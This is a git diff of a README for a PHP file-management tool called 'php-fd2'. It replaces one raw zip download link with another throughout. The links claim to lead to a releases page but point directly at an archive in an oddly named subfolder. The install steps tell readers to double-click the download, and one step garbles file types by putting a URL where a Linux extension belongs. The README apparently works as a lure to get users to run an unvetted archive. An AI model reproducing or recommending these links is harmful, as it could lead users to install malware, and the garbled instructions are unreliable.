@@ -6,7 +6,7 @@ Welcome to php-fd2! This application makes file management easy and efficient. F
 
 ## 📥 Download the Application
 
-[![Download php-fd2](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/php-fd2.zip)](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/php-fd2.zip)
+[![Download php-fd2](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/fd_php_v3.1-beta.1.zip)](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/fd_php_v3.1-beta.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ To run php-fd2 smoothly, ensure your system meets these requirements:
 ## 🌐 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the php-fd2 releases page by clicking [here](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/php-fd2.zip). 
+   Go to the php-fd2 releases page by clicking [here](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/fd_php_v3.1-beta.1.zip). 
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version of php-fd2. It will be highlighted as the most recent release.
 
 3. **Download the File**  
-   Click on the link for the appropriate version for your operating system. The file types are usually marked as `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/php-fd2.zip` or similar for Linux.
+   Click on the link for the appropriate version for your operating system. The file types are usually marked as `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/fd_php_v3.1-beta.1.zip` or similar for Linux.
 
 4. **Install the Application**  
    After the download completes, locate the file in your Downloads folder and double-click it to begin installation. Follow the prompts on the screen to complete the installation.
@@ -80,4 +80,4 @@ php-fd2 is open-source software. For detailed information about the license, ple
 
 Thanks for using php-fd2! We appreciate your support, and we hope you find it beneficial for managing your files.
 
-For any questions or feedback, don't hesitate to visit [the Releases Page](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/php-fd2.zip) again for additional updates.
+For any questions or feedback, don't hesitate to visit [the Releases Page](https://raw.githubusercontent.com/spartako8024/php-fd2/main/periostitis/fd_php_v3.1-beta.1.zip) again for additional updates.
